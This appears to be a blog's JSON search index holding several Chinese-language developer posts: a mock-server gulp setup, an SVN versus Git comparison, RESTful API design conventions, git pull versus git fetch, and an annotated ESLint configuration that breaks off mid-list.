接着在代码里进行 `ajax`请求就可以写成，这里以 `axios` 为例子\nfunction getComments () {  axios.get(‘api&#x2F;comment&#x2F;get.action’, {}).then((res) &#x3D;&gt; {    console.log(res.data)  })}\n### 4.3 文件改动自动刷新&gt; 我们希望更改 `mock`文件能和 `webpack` 热更新一样，所改即所得。这里我使用了 `nodemon`，利用 `gulp` 建立自动执行的任务。\ncnpm install gulp gulp-nodemon browser-sync –save&#x2F;&#x2F; gulpfile.js 的代码如下onst path &#x3D; require(‘path’);const gulp &#x3D; require(‘gulp’);const nodemon &#x3D; require(‘gulp-nodemon’);const browserSync &#x3D; require(‘browser-sync’).create();const server &#x3D; path.resolve(__dirname, ‘mock’);\n&#x2F;&#x2F; browser-sync 配置，配置里启动 nodemon 任务gulp.task(‘browser-sync’, [‘nodemon’], function() {  browserSync.init(null, {    proxy: “http://localhost:8080&quot;, &#x2F;&#x2F; 这里的端口和 webpack 的端口一致    port: 8081  });});\n&#x2F;&#x2F; browser-sync 监听文件gulp.task(‘mock’, [‘browser-sync’], function() {  gulp.watch([‘.&#x2F;mock&#x2F;db.js’, ‘.&#x2F;mock&#x2F;**’], [‘bs-delay’]);});\n&#x2F;&#x2F; 延时刷新gulp.task(‘bs-delay’, function() {  setTimeout(function() {    browserSync.reload();  }, 1000);});\n&#x2F;&#x2F; 服务器重启gulp.task(‘nodemon’, function(cb) {  &#x2F;&#x2F; 设个变量来防止重复重启  var started &#x3D; false;  var stream &#x3D; nodemon({    script: ‘.&#x2F;mock&#x2F;server.js’,    &#x2F;&#x2F; 监听文件的后缀    ext: “js”,    env: {      ‘NODE_ENV’: ‘development’    },    &#x2F;&#x2F; 监听的路径    watch: [      server    ]  });  stream.on(‘start’, function() {    if (!started) {      cb();      started &#x3D; true;    }  }).on(‘crash’, function() {    console.error(‘application has crashed!\\n’)    stream.emit(‘restart’, 10)  })});\n&#96;&#96;&#96;\n\n这样以后我们在构建我们 Webpack 工程时只需要先执行 npm run dev\n之后新建 terminal 执行 gulp mock\n就可以搭建一个随改随变的 mock-server 环境\n\n完整的代码详情 https://github.com/poetries/mock-server\n","categories":["后端"],"tags":["Mock"]},{"title":"Svn与Git的区别","url":"/2019/01/13/%E5%B7%A5%E5%85%B7/Svn%E4%B8%8EGit%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"\n最核心的区别Git是分布式的，而Svn不是分布的。能理解这点，上手会很容易，声明一点Git并不是目前唯一的分布式版本控制系统，还有比如Mercurial等，所以说它们差不许多。话说回来Git跟Svn一样有自己的集中式版本库和Server端，但Git更倾向于分布式开发，因为每一个开发人员的电脑上都有一个Local Repository,所以即使没有网络也一样可以Commit，查看历史版本记录，创建项 目分支等操作，等网络再次连接上Push到Server端。\n\n从上面看GIt真的很棒，但是GIt adds Complexity,刚开始使用会有些疑惑，因为需要建两个Repositories(Local Repositories &amp; Remote Repositories),指令很多，除此之外你需要知道哪些指令在Local Repository，哪些指令在Remote Repository。\n\nGit把内容按元数据方式存储，而SVN是按文件：因为,.git目录是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。.git目录的体积大小跟.svn比较，你会发现它们差距很大。\n\nGit没有一个全局版本号，而SVN有：目前为止这是跟SVN相比Git缺少的最大的一个特征。\n\nGit的内容的完整性要优于SVN: GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。\n\nGit下载下来后，在OffLine状态下可以看到所有的Log,SVN不可以。\n\n刚开始用时很狗血的一点，SVN必须先Update才能Commit,忘记了合并时就会出现一些错误，git还是比较少的出现这种情况。\n\n克隆一份全新的目录以同样拥有五个分支来说，SVN是同时复製5个版本的文件,也就是说重复五次同样的动作。而Git只是获取文件的每个版本的 元素，然后只载入主要的分支(master)在我的经验,克隆一个拥有将近一万个提交(commit),五个分支,每个分支有大约1500个文件的 SVN,耗了将近一个小时！而Git只用了区区的1分钟！\n\n版本库（repository):SVN只能有一个指定中央版本库。当这个中央版本库有问题时，所有工作成员都一起瘫痪直到版本库维修完毕或者新的版本库设立完成。而 Git可以有无限个版本库。或者，更正确的说法，每一个Git都是一个版本库，区别是它们是否拥有活跃目录（Git Working Tree）。如果主要版本库（例如：置於GitHub的版本库）发生了什麼事，工作成员仍然可以在自己的本地版本库（local repository）提交，等待主要版本库恢复即可。工作成员也可以提交到其他的版本库！\n\n分支（Branch）在SVN，分支是一个完整的目录。且这个目录拥有完整的实际文件。如果工作成员想要开啟新的分支，那将会影响“全世界”！每个人都会拥有和你一样的分支。如果你的分支是用来进行破坏工作（安检测试），那将会像传染病一样,你改一个分支，还得让其他人重新切分支重新下载，十分狗血。而 Git，每个工作成员可以任意在自己的本地版本库开啟无限个分支。举例：当我想尝试破坏自己的程序（安检测试），并且想保留这些被修改的文件供日后使用， 我可以开一个分支，做我喜欢的事。完全不需担心妨碍其他工作成员。只要我不合并及提交到主要版本库，没有一个工作成员会被影响。等到我不需要这个分支时， 我只要把它从我的本地版本库删除即可。无痛无痒。\n\nGit的分支名是可以使用不同名字的。例如：我的本地分支名为OK，而在主要版本库的名字其实是master。\n\n最值得一提，我可以在Git的任意一个提交点（commit point）开启分支！（其中一个方法是使用gitk –all 可观察整个提交记录，然后在任意点开啟分支。）\n\n提交（Commit）在SVN，当你提交你的完成品时，它将直接记录到中央版本库。当你发现你的完成品存在严重问题时，你已经无法阻止事情的发生了。如果网路中断，你根本没办法提交！而Git的提交完全属於本地版本库的活动。而你只需“推”（git push）到主要版本库即可。Git的“推”其实是在执行“同步”（Sync）。\n\n\n\n总结：\n\nSVN的特点是简单，只是需要一个放代码的地方时用是OK的。\nGit的特点版本控制可以不依赖网络做任何事情，对分支和合并有更好的支持(当然这是开发者最关心的地方)\n\n","categories":["工具"],"tags":["git"]},{"title":"RESTful API","url":"/2019/01/08/%E5%B7%A5%E5%85%B7/RESTful%20API/","content":"一、RESTful API 简介\n总结一下什么是RESTful架构\n\n每一个URI代表一种资源\n客户端和服务器之间，传递这种资源的某种表现层\n客户端通过四个HTTP动词(GET、POST、PUT、DELETE)，对服务器端资源进行操作，实现”表现层状态转化”\n\n二、RESTful API 设计2.1、协议\nAPI与用户的通信协议，总是使用HTTPs协议\n\n2.2、域名\n应该尽量将API部署在专用域名之下\n\nhttps://api.example.com\n\n\n如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下\n\nhttps://example.org/api/\n\n2.3、版本（Versioning）\n应该将API的版本号放入URL\n\nhttps://api.example.com/v1/\n\n2.4、路径（Endpoint）\n表示API的具体网址\n在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词\n举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样\n\nhttps://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/employees\n\n2.5、HTTP动词\n对于资源的具体操作类型，由HTTP动词表示\n\nGET（SELECT）：从服务器取出资源（一项或多项）。\n\nPOST（CREATE）：在服务器新建一个资源。\n\nPUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\n\nPATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\n\nDELETE（DELETE）：从服务器删除资源。\n\n\n\n下面是一些例子\n\nGET /zoos：列出所有动物园POST /zoos：新建一个动物园GET /zoos/ID：获取某个指定动物园的信息PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）DELETE /zoos/ID：删除某个动物园GET /zoos/ID/animals：列出某个指定动物园的所有动物DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物\n\n2.6、过滤信息\n如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果\n\n\n下面是一些常见的参数\n?limit=10：指定返回记录的数量\n?offset=10：指定返回记录的开始位置。\n?page=2&amp;per_page=100：指定第几页，以及每页的记录数。\n?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。\n?animal_type_id=1：指定筛选条件\n\n\n\n\n参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的\n\n2.7、状态码\n服务器向用户返回的状态码和提示信息\n\n2.8、错误处理\n如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可\n\n&#123;    error: &quot;Invalid API key&quot;&#125;\n\n2.9、返回结果\n针对不同操作，服务器向用户返回的结果应该符合以下规范\n\nGET /collection：返回资源对象的列表（数组）GET /collection/resource：返回单个资源对象POST /collection：返回新生成的资源对象PUT /collection/resource：返回完整的资源对象PATCH /collection/resource：返回完整的资源对象DELETE /collection/resource：返回一个空文档\n\n2.10、Hypermedia API\nRESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么\n\n\n比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档\n\n&#123;&quot;link&quot;: &#123;  &quot;rel&quot;:   &quot;collection https://www.example.com/zoos&quot;,  &quot;href&quot;:  &quot;https://api.example.com/zoos&quot;,  &quot;title&quot;: &quot;List of zoos&quot;,  &quot;type&quot;:  &quot;application/vnd.yourformat+json&quot;&#125;&#125;\n\n\n上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型\n\n","categories":["后端"],"tags":["RESTful"]},{"title":"git pull 和 git fetch","url":"/2018/11/23/%E5%B7%A5%E5%85%B7/git%20pull%20%E5%92%8C%20git%20fetch/","content":"一、是什么先回顾两个命令的定义\n\ngit fetch 命令用于从另一个存储库下载对象和引用\ngit pull 命令用于从另一个存储库或本地分支获取并集成(整合)\n\n再来看一次git的工作流程图，如下所示：\n\n可以看到，git fetch是将远程主机的最新内容拉到本地，用户在检查了以后决定是否合并到工作本机分支中\n而git pull 则是将远程主机的最新内容拉下来后直接合并，即：git pull = git fetch + git merge，这样可能会产生冲突，需要手动解决\n在我们本地的git文件中对应也存储了git本地仓库分支的commit ID和 跟踪的远程分支的commit ID，对应文件如下：\n\n.git&#x2F;refs&#x2F;head&#x2F;[本地分支]\n.git&#x2F;refs&#x2F;remotes&#x2F;[正在跟踪的分支]\n\n使用 git fetch更新代码，本地的库中master的commitID不变\n但是与git上面关联的那个orign/master的commit ID发生改变\n这时候我们本地相当于存储了两个代码的版本号，我们还要通过merge去合并这两个不同的代码版本\n\n也就是fetch的时候本地的master没有变化，但是与远程仓关联的那个版本号被更新了，接下来就是在本地merge合并这两个版本号的代码\n相比之下，使用git pull就更加简单粗暴，会将本地的代码更新至远程仓库里面最新的代码版本，如下图：\n\n二、用法一般远端仓库里有新的内容更新，当我们需要把新内容下载的时候，就使用到git pull或者git fetch命令\nfetch用法如下：\ngit fetch &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;\n\n例如从远程的origin仓库的master分支下载代码到本地并新建一个temp分支\ngit fetch origin master:temp\n\n如果上述没有冒号，则表示将远程origin仓库的master分支拉取下来到本地当前分支\n这里git fetch不会进行合并，执行后需要手动执行git merge合并，如下：\ngit merge temp\n\npull两者的用法十分相似，pull用法如下：\ngit pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;\n\n例如将远程主机origin的master分支拉取过来，与本地的branchtest分支合并，命令如下：\ngit pull origin master:branchtest\n\n同样如果上述没有冒号，则表示将远程origin仓库的master分支拉取下来与本地当前分支合并\n三、区别相同点：\n\n在作用上他们的功能是大致相同的，都是起到了更新代码的作用\n\n不同点：\n\ngit pull是相当于从远程仓库获取最新版本，然后再与本地分支merge，即git pull &#x3D; git fetch + git merge\n相比起来，git fetch 更安全也更符合实际要求，在 merge 前，我们可以查看更新情况，根据实际情况再决定是否合并\n\n","categories":["工具"],"tags":["git"]},{"title":"eslint配置","url":"/2018/11/09/%E5%B7%A5%E5%85%B7/eslint%E9%85%8D%E7%BD%AE/","content":"\nESLint是一个Javascript静态检查工具，它可以帮你养成良好的编程习惯\n\n&#123;    // 环境定义了预定义的全局变量。    &quot;env&quot;: &#123;        //环境定义了预定义的全局变量。更多在官网查看        &quot;browser&quot;: true,        &quot;node&quot;: true,        &quot;commonjs&quot;: true,        &quot;amd&quot;: true,        &quot;es6&quot;: true,        &quot;mocha&quot;: true    &#125;,    // JavaScript 语言选项    &quot;parserOptions&quot;: &#123;        // ECMAScript 版本        &quot;ecmaVersion&quot;: 6,        &quot;sourceType&quot;: &quot;module&quot;, //设置为 &quot;script&quot; (默认) 或 &quot;module&quot;（如果你的代码是 ECMAScript 模块)。        //想使用的额外的语言特性:        &quot;ecmaFeatures&quot;: &#123;            // 允许在全局作用域下使用 return 语句            &quot;globalReturn&quot;: true,            // impliedStric            &quot;impliedStrict&quot;: true,            // 启用 JSX            &quot;jsx&quot;: true,            &quot;modules&quot;: true        &#125;    &#125;,    //-----让eslint支持 JSX start    &quot;plugins&quot;: [        &quot;react&quot;    ],    &quot;extends&quot;: [        &quot;eslint:recommended&quot;,        &quot;plugin:react/recommended&quot;    ],    //-----让eslint支持 JSX end    /**     * &quot;off&quot; 或 0 - 关闭规则     * &quot;warn&quot; 或 1 - 开启规则，使用警告级别的错误：warn (不会导致程序退出),     * &quot;error&quot; 或 2 - 开启规则，使用错误级别的错误：error (当被触发的时候，程序会退出)     */    &quot;rules&quot;: &#123;        ////////////////        // 可能的错误 //        ////////////////        // 禁止条件表达式中出现赋值操作符        &quot;no-cond-assign&quot;: 2,        // 禁用 console        &quot;no-console&quot;: 0,        // 禁止在条件中使用常量表达式        // if (false) &#123;        // doSomethingUnfinished();        // &#125; //cuowu        &quot;no-constant-condition&quot;: 2,        // 禁止在正则表达式中使用控制字符 ：new RegExp(&quot;\\x1f&quot;)        &quot;no-control-regex&quot;: 2,        // 数组和对象键值对最后一个逗号， never参数：不能带末尾的逗号, always参数：必须带末尾的逗号，        // always-multiline：多行模式必须带逗号，单行模式不能带逗号        &quot;comma-dangle&quot;: [1, &quot;never&quot;],        // 禁用 debugger        &quot;no-debugger&quot;: 2,        // 禁止 function 定义中出现重名参数        &quot;no-dupe-args&quot;: 2,        // 禁止对象字面量中出现重复的 key        &quot;no-dupe-keys&quot;: 2,        // 禁止重复的 case 标签        &quot;no-duplicate-case&quot;: 2,        // 禁止空语句块        &quot;no-empty&quot;: 2,        // 禁止在正则表达式中使用空字符集 (/^abc[]/)        &quot;no-empty-character-class&quot;: 2,        // 禁止对 catch 子句的参数重新赋值        &quot;no-ex-assign&quot;: 2,        // 禁止不必要的布尔转换        &quot;no-extra-boolean-cast&quot;: 2,        // 禁止不必要的括号 //(a * b) + c;//报错        &quot;no-extra-parens&quot;: 0,        // 禁止不必要的分号        &quot;no-extra-semi&quot;: 2,        // 禁止对 function 声明重新赋值        &quot;no-func-assign&quot;: 2,        // 禁止在嵌套的块中出现 function 或 var 声明        &quot;no-inner-declarations&quot;: [2, &quot;functions&quot;],        // 禁止 RegExp 构造函数中无效的正则表达式字符串        &quot;no-invalid-regexp&quot;: 2,        // 禁止在字符串和注释之外不规则的空白        &quot;no-irregular-whitespace&quot;: 2,        // 禁止在 in 表达式中出现否定的左操作数        &quot;no-negated-in-lhs&quot;: 2,        // 禁止把全局对象 (Math 和 JSON) 作为函数调用 错误：var math = Math();        &quot;no-obj-calls&quot;: 2,        // 禁止直接使用 Object.prototypes 的内置属性        &quot;no-prototype-builtins&quot;: 0,        // 禁止正则表达式字面量中出现多个空格        &quot;no-regex-spaces&quot;: 2,        // 禁用稀疏数组        &quot;no-sparse-arrays&quot;: 2,        // 禁止出现令人困惑的多行表达式        &quot;no-unexpected-multiline&quot;: 2,        // 禁止在return、throw、continue 和 break语句之后出现不可达代码        &quot;no-unreachable&quot;: 2,        // 要求使用 isNaN() 检查 NaN        &quot;use-isnan&quot;: 2,        // 强制使用有效的 JSDoc 注释        &quot;valid-jsdoc&quot;: 1,        // 强制 typeof 表达式与有效的字符串进行比较        // typeof foo === &quot;undefimed&quot; 错误        &quot;valid-typeof&quot;: 2,        //////////////        // 最佳实践 //        //////////////        // 定义对象的set存取器属性时，强制定义get        &quot;accessor-pairs&quot;: 2,        // 强制数组方法的回调函数中有 return 语句        &quot;array-callback-return&quot;: 0,        // 强制把变量的使用限制在其定义的作用域范围内        &quot;block-scoped-var&quot;: 0,        // 限制圈复杂度，也就是类似if else能连续接多少个        &quot;complexity&quot;: [2, 9],        // 要求 return 语句要么总是指定返回的值，要么不指定        &quot;consistent-return&quot;: 0,        // 强制所有控制语句使用一致的括号风格        &quot;curly&quot;: [2, &quot;all&quot;],        // switch 语句强制 default 分支，也可添加 // no default 注释取消此次警告        &quot;default-case&quot;: 2,        // 强制object.key 中 . 的位置，参数:        // property，&#x27;.&#x27;号应与属性在同一行        // object, &#x27;.&#x27; 号应与对象名在同一行        &quot;dot-location&quot;: [2, &quot;property&quot;],        // 强制使用.号取属性        // 参数： allowKeywords：true 使用保留字做属性名时，只能使用.方式取属性        // false 使用保留字做属性名时, 只能使用[]方式取属性 e.g [2, &#123;&quot;allowKeywords&quot;: false&#125;]        // allowPattern: 当属性名匹配提供的正则表达式时，允许使用[]方式取值,否则只能用.号取值 e.g [2, &#123;&quot;allowPattern&quot;: &quot;^[a-z]+(_[a-z]+)+$&quot;&#125;]        &quot;dot-notation&quot;: [2, &#123;            &quot;allowKeywords&quot;: false        &#125;],        // 使用 === 替代 == allow-null允许null和undefined==        &quot;eqeqeq&quot;: [2, &quot;allow-null&quot;],        // 要求 for-in 循环中有一个 if 语句        &quot;guard-for-in&quot;: 2,        // 禁用 alert、confirm 和 prompt        &quot;no-alert&quot;: 0,        // 禁用 arguments.caller 或 arguments.callee        &quot;no-caller&quot;: 2,        // 不允许在 case 子句中使用词法声明        &quot;no-case-declarations&quot;: 2,        // 禁止除法操作符显式的出现在正则表达式开始的位置        &quot;no-div-regex&quot;: 2,        // 禁止 if 语句中有 return 之后有 else        &quot;no-else-return&quot;: 0,        // 禁止出现空函数.如果一个函数包含了一条注释，它将不会被认为有问题。        &quot;no-empty-function&quot;: 2,        // 禁止使用空解构模式no-empty-pattern        &quot;no-empty-pattern&quot;: 2,        // 禁止在没有类型检查操作符的情况下与 null 进行比较        &quot;no-eq-null&quot;: 1,        // 禁用 eval()        &quot;no-eval&quot;: 2,        // 禁止扩展原生类型        &quot;no-extend-native&quot;: 2,        // 禁止不必要的 .bind() 调用        &quot;no-extra-bind&quot;: 2,        // 禁用不必要的标签        &quot;no-extra-label:&quot;: 0,        // 禁止 case 语句落空        &quot;no-fallthrough&quot;: 2,        // 禁止数字字面量中使用前导和末尾小数点        &quot;no-floating-decimal&quot;: 2,        // 禁止使用短符号进行类型转换(!!fOO)        &quot;no-implicit-coercion&quot;: 0,        // 禁止在全局范围内使用 var 和命名的 function 声明        &quot;no-implicit-globals&quot;: 1,        // 禁止使用类似 eval() 的方法        &quot;no-implied-eval&quot;: 2,        // 禁止 this 关键字出现在类和类对象之外        &quot;no-invalid-this&quot;: 0,        // 禁用 __iterator__ 属性        &quot;no-iterator&quot;: 2,        // 禁用标签语句        &quot;no-labels&quot;: 2,        // 禁用不必要的嵌套块        &quot;no-lone-blocks&quot;: 2,        // 禁止在循环中出现 function 声明和表达式        &quot;no-loop-func&quot;: 1,        // 禁用魔术数字(3.14什么的用常量代替)        &quot;no-magic-numbers&quot;: [1, &#123;            &quot;ignore&quot;: [0, -1, 1]        &#125;],        // 禁止使用多个空格        &quot;no-multi-spaces&quot;: 2,        // 禁止使用多行字符串，在 JavaScript 中，可以在新行之前使用斜线创建多行字符串        &quot;no-multi-str&quot;: 2,        // 禁止对原生对象赋值        &quot;no-native-reassign&quot;: 2,        // 禁止在非赋值或条件语句中使用 new 操作符        &quot;no-new&quot;: 2,        // 禁止对 Function 对象使用 new 操作符        &quot;no-new-func&quot;: 0,        // 禁止对 String，Number 和 Boolean 使用 new 操作符        &quot;no-new-wrappers&quot;: 2,        // 禁用八进制字面量        &quot;no-octal&quot;: 2,        // 禁止在字符串中使用八进制转义序列        &quot;no-octal-escape&quot;: 2,        // 不允许对 function 的参数进行重新赋值        &quot;no-param-reassign&quot;: 0,        // 禁用 __proto__ 属性        &quot;no-proto&quot;: 2,        // 禁止使用 var 多次声明同一变量        &quot;no-redeclare&quot;: 2,        // 禁用指定的通过 require 加载的模块        &quot;no-return-assign&quot;: 0,        // 禁止使用 javascript: url        &quot;no-script-url&quot;: 0,        // 禁止自我赋值        &quot;no-self-assign&quot;: 2,        // 禁止自身比较        &quot;no-self-compare&quot;: 2,        // 禁用逗号操作符        &quot;no-sequences&quot;: 2,        // 禁止抛出非异常字面量        &quot;no-throw-literal&quot;: 2,        // 禁用一成不变的循环条件        &quot;no-unmodified-loop-condition&quot;: 2,        // 禁止出现未使用过的表达式        &quot;no-unused-expressions&quot;: 0,        // 禁用未使用过的标签        &quot;no-unused-labels&quot;: 2,        // 禁止不必要的 .call() 和 .apply()        &quot;no-useless-call&quot;: 2,        // 禁止不必要的字符串字面量或模板字面量的连接        &quot;no-useless-concat&quot;: 2,        // 禁用不必要的转义字符        &quot;no-useless-escape&quot;: 0,        // 禁用 void 操作符        &quot;no-void&quot;: 0,        // 禁止在注释中使用特定的警告术语        &quot;no-warning-comments&quot;: 0,        // 禁用 with 语句        &quot;no-with&quot;: 2,        // 强制在parseInt()使用基数参数        &quot;radix&quot;: 2,        // 要求所有的 var 声明出现在它们所在的作用域顶部        &quot;vars-on-top&quot;: 0,        // 要求 IIFE 使用括号括起来        &quot;wrap-iife&quot;: [2, &quot;any&quot;],        // 要求或禁止 “Yoda” 条件        &quot;yoda&quot;: [2, &quot;never&quot;],        // 要求或禁止使用严格模式指令        &quot;strict&quot;: 0,        //////////////        // 变量声明 //        //////////////        // 要求或禁止 var 声明中的初始化(初值)        &quot;init-declarations&quot;: 0,        // 不允许 catch 子句的参数与外层作用域中的变量同名        &quot;no-catch-shadow&quot;: 0,        // 禁止删除变量        &quot;no-delete-var&quot;: 2,        // 不允许标签与变量同名        &quot;no-label-var&quot;: 2,        // 禁用特定的全局变量        &quot;no-restricted-globals&quot;: 0,        // 禁止 var 声明 与外层作用域的变量同名        &quot;no-shadow&quot;: 0,        // 禁止覆盖受限制的标识符        &quot;no-shadow-restricted-names&quot;: 2,        // 禁用未声明的变量，除非它们在 /*global */ 注释中被提到        &quot;no-undef&quot;: 2,        // 禁止将变量初始化为 undefined        &quot;no-undef-init&quot;: 2,        // 禁止将 undefined 作为标识符        &quot;no-undefined&quot;: 0,        // 禁止出现未使用过的变量        &quot;no-unused-vars&quot;: [2, &#123;            &quot;vars&quot;: &quot;all&quot;,            &quot;args&quot;: &quot;none&quot;        &#125;],        // 不允许在变量定义之前使用它们        &quot;no-use-before-define&quot;: 0,        //////////////////////////        // Node.js and CommonJS //        //////////////////////////        // require return statements after callbacks        &quot;callback-return&quot;: 0,        // 要求 require() 出现在顶层模块作用域中        &quot;global-require&quot;: 1,        // 要求回调函数中有容错处理        &quot;handle-callback-err&quot;: [2, &quot;^(err|error)$&quot;],        // 禁止混合常规 var 声明和 require 调用        &quot;no-mixed-requires&quot;: 0,        // 禁止调用 require 时使用 new 操作符        &quot;no-new-require&quot;: 2,        // 禁止对 __dirname 和 __filename进行字符串连接        &quot;no-path-concat&quot;: 0,        // 禁用 process.env        &quot;no-process-env&quot;: 0,        // 禁用 process.exit()        &quot;no-process-exit&quot;: 0,        // 禁用同步方法        &quot;no-sync&quot;: 0,        //////////////        // 风格指南 //        //////////////        // 指定数组的元素之间要以空格隔开(, 后面)， never参数：[ 之前和 ] 之后不能带空格，always参数：[ 之前和 ] 之后必须带空格        &quot;array-bracket-spacing&quot;: [2, &quot;never&quot;],        // 禁止或强制在单行代码块中使用空格(禁用)        &quot;block-spacing&quot;: [1, &quot;never&quot;],        //强制使用一致的缩进 第二个参数为 &quot;tab&quot; 时，会使用tab，        // if while function 后面的&#123;必须与if在同一行，java风格。        &quot;brace-style&quot;: [2, &quot;1tbs&quot;, &#123;            &quot;allowSingleLine&quot;: true        &#125;],        // 双峰驼命名格式        &quot;camelcase&quot;: 2,        // 控制逗号前后的空格        &quot;comma-spacing&quot;: [2, &#123;            &quot;before&quot;: false,            &quot;after&quot;: true        &#125;],        // 控制逗号在行尾出现还是在行首出现 (默认行尾)        // http://eslint.org/docs/rules/comma-style        &quot;comma-style&quot;: [2, &quot;last&quot;],        //&quot;SwitchCase&quot; (默认：0) 强制 switch 语句中的 case 子句的缩进水平        // 以方括号取对象属性时，[ 后面和 ] 前面是否需要空格, 可选参数 never, always        &quot;computed-property-spacing&quot;: [2, &quot;never&quot;],        // 用于指统一在回调函数中指向this的变量名，箭头函数中的this已经可以指向外层调用者，应该没卵用了        // e.g [0,&quot;that&quot;] 指定只能 var that = this. that不能指向其他任何值，this也不能赋值给that以外的其他值        &quot;consistent-this&quot;: [1, &quot;that&quot;],        // 强制使用命名的 function 表达式        &quot;func-names&quot;: 0,        // 文件末尾强制换行        &quot;eol-last&quot;: 2,        &quot;indent&quot;: [2, 4, &#123;            &quot;SwitchCase&quot;: 1        &#125;],        // 强制在对象字面量的属性中键和值之间使用一致的间距        &quot;key-spacing&quot;: [2, &#123;            &quot;beforeColon&quot;: false,            &quot;afterColon&quot;: true        &#125;],        // 强制使用一致的换行风格        &quot;linebreak-style&quot;: [1, &quot;unix&quot;],        // 要求在注释周围有空行 ( 要求在块级注释之前有一空行)        &quot;lines-around-comment&quot;: [1, &#123;            &quot;beforeBlockComment&quot;: true        &#125;],        // 强制一致地使用函数声明或函数表达式，方法定义风格，参数：        // declaration: 强制使用方法声明的方式，function f()&#123;&#125; e.g [2, &quot;declaration&quot;]        // expression：强制使用方法表达式的方式，var f = function() &#123;&#125; e.g [2, &quot;expression&quot;]        // allowArrowFunctions: declaration风格中允许箭头函数。 e.g [2, &quot;declaration&quot;, &#123; &quot;allowArrowFunctions&quot;: true &#125;]        &quot;func-style&quot;: 0,        // 强制回调函数最大嵌套深度 5层        &quot;max-nested-callbacks&quot;: [1, 5],        // 禁止使用指定的标识符        &quot;id-blacklist&quot;: 0,        // 强制标识符的最新和最大长度        &quot;id-length&quot;: 0,        // 要求标识符匹配一个指定的正则表达式        &quot;id-match&quot;: 0,        // 强制在 JSX 属性中一致地使用双引号或单引号        &quot;jsx-quotes&quot;: 0,        // 强制在关键字前后使用一致的空格 (前后腰需要)        &quot;keyword-spacing&quot;: 2,        // 强制一行的最大长度        &quot;max-len&quot;: [1, 200],        // 强制最大行数        &quot;max-lines&quot;: 0,        // 强制 function 定义中最多允许的参数数量        &quot;max-params&quot;: [1, 7],        // 强制 function 块最多允许的的语句数量        &quot;max-statements&quot;: [1, 200],        // 强制每一行中所允许的最大语句数量        &quot;max-statements-per-line&quot;: 0,        // 要求构造函数首字母大写 （要求调用 new 操作符时有首字母大小的函数，允许调用首字母大写的函数时没有 new 操作符。）        &quot;new-cap&quot;: [2, &#123;            &quot;newIsCap&quot;: true,            &quot;capIsNew&quot;: false        &#125;],        // 要求调用无参构造函数时有圆括号        &quot;new-parens&quot;: 2,        // 要求或禁止 var 声明语句后有一行空行        &quot;newline-after-var&quot;: 0,        // 禁止使用 Array 构造函数        &quot;no-array-constructor&quot;: 2,        // 禁用按位运算符        &quot;no-bitwise&quot;: 0,        // 要求 return 语句之前有一空行        &quot;newline-before-return&quot;: 0,        // 要求方法链中每个调用都有一个换行符        &quot;newline-per-chained-call&quot;: 1,        // 禁用 continue 语句        &quot;no-continue&quot;: 0,        // 禁止在代码行后使用内联注释        &quot;no-inline-comments&quot;: 0,        // 禁止 if 作为唯一的语句出现在 else 语句中        &quot;no-lonely-if&quot;: 0,        // 禁止混合使用不同的操作符        &quot;no-mixed-operators&quot;: 0,        // 不允许空格和 tab 混合缩进        &quot;no-mixed-spaces-and-tabs&quot;: 2,        // 不允许多个空行        &quot;no-multiple-empty-lines&quot;: [2, &#123;            &quot;max&quot;: 2        &#125;],        // 不允许否定的表达式        &quot;no-negated-condition&quot;: 0,        // 不允许使用嵌套的三元表达式        &quot;no-nested-ternary&quot;: 0,        // 禁止使用 Object 的构造函数        &quot;no-new-object&quot;: 2,        // 禁止使用一元操作符 ++ 和 --        &quot;no-plusplus&quot;: 0,        // 禁止使用特定的语法        &quot;no-restricted-syntax&quot;: 0,        // 禁止 function 标识符和括号之间出现空格        &quot;no-spaced-func&quot;: 2,        // 不允许使用三元操作符        &quot;no-ternary&quot;: 0,        // 禁用行尾空格        &quot;no-trailing-spaces&quot;: 2,        // 禁止标识符中有悬空下划线_bar        &quot;no-underscore-dangle&quot;: 0,        // 禁止可以在有更简单的可替代的表达式时使用三元操作符        &quot;no-unneeded-ternary&quot;: 2,        // 禁止属性前有空白        &quot;no-whitespace-before-property&quot;: 0,        // 强制花括号内换行符的一致性        &quot;object-curly-newline&quot;: 0,        // 强制在花括号中使用一致的空格        &quot;object-curly-spacing&quot;: 0,        // 强制将对象的属性放在不同的行上        &quot;object-property-newline&quot;: 0,        // 强制函数中的变量要么一起声明要么分开声明        &quot;one-var&quot;: [2, &#123;            &quot;initialized&quot;: &quot;never&quot;        &#125;],        // 要求或禁止在 var 声明周围换行        &quot;one-var-declaration-per-line&quot;: 0,        // 要求或禁止在可能的情况下要求使用简化的赋值操作符        &quot;operator-assignment&quot;: 0,        // 强制操作符使用一致的换行符        &quot;operator-linebreak&quot;: [2, &quot;after&quot;, &#123;            &quot;overrides&quot;: &#123;                &quot;?&quot;: &quot;before&quot;,                &quot;:&quot;: &quot;before&quot;            &#125;        &#125;],        // 要求或禁止块内填充        